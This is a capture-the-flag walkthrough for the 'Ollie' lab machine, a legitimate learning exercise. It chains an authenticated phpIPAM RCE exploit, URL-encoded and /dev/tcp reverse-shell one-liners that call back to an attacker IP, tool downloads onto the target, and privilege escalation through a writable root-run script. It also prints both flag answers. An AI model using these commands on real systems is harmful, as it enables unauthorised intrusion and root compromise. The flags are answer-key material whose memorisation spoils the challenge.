# Ollie - Medium

```shell
sudo vim /etc/hosts
#add ollie.thm

nmap -T4 -p- -A -Pn -v ollie.thm

feroxbuster -u http://ollie.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,403,404,405,500

searchsploit phpipam

nc ollie.thm 1337
#we can interact with service
#this gives us creds for login on port 80

#get rce exploit script
python3 50963.py -url http://ollie.thm -usr admin -pwd "OllieUnixMontgomery\!" -cmd "id"

#setup listener
nc -nvlp 4444

#run exploit

#we get reverse-shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

su ollie
#attempt password reuse
#it works

cd

cat user.txt

#in attacker machine
python3 -m http.server

#in ollie revshell
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#get pspy
wget http://10.14.31.212:8000/pspy64

chmod +x pspy64

./pspy64
#this shows feedme run as root

#stop this process
#and get shell again as ollie

nc -nvlp 4444
#get shell again

su ollie

ls -la /usr/bin/feedme
#we can read and write to this

cat /usr/bin/feedme

echo "sh -i >& /dev/tcp/10.14.31.212/6666 0>&1" >> /usr/bin/feedme

#setup listener
nc -nvlp 6666
#we get root shell

cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.41
  * 1337 - waste

* Checking the webpage on port 80, we can see a login page for ```Ollie```.

* The footer shows that it is based on ```phpIPAM v1.4.5```.

* We can also enumerate the web directories using ```feroxbuster``` for clues.

* We get a few directories such as /app, /db, /functions, /install and /upgrade

* ```searchsploit``` shows a few SQLi and RCE exploits related to the ```phpIPAM``` software; we can look into that as well.

* ```nmap``` shows that we have a service on port 1337 as well - we can interact with it using ```nc```.

* Interacting with the service on 1337 shows that it is a chat service; it asks us a few questions.

* Replying with the correct answer out of the given options gives us the password for admin login on port 80.

* Now, we can log into the portal and attempt for the authenticated RCE exploit.

* Running the RCE exploit script works, and we are able to execute commands as ```www-data```.

* In order to get reverse-shell on our listener, we need to execute the following command, which is URL-encoded reverse-shell one-liner:

```rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20%2Di%202%3E%261%7Cnc%2010%2E14%2E31%2E212%204444%20%3E%2Ftmp%2Ff```

* If this does not work, we can navigate to <http://ollie.thm/evil.php?cmd=id>, and execute our command here.

* In our reverse-shell, we can now attempt for password-reuse with the password we used earlier for admin login.

* After getting user flag, we can start enumeration using ```linpeas```.

* ```linpeas``` does not give us anything, so we can attempt to use ```pspy``` to check for processes.

* ```pspy``` shows that a program ```feedme``` runs every minute, but it is not included in the cronjob.

* The program is run as ```/bin/bash /usr/bin/feedme```, and it is run as root (uid 0); we can inspect this binary.

* We will have to stop this process, and get shell as 'ollie' again, using the same method.

* We can check the binary - it shows we have write permissions.

* We can append a reverse-shell one-liner to the binary, and setup listener - we get root shell in a minute.

```markdown
1. What is the user.txt flag? - THM{Ollie_boi_is_daH_Cut3st}

2. What is the root.txt flag? - THM{Ollie_Luvs_Chicken_Fries}
```
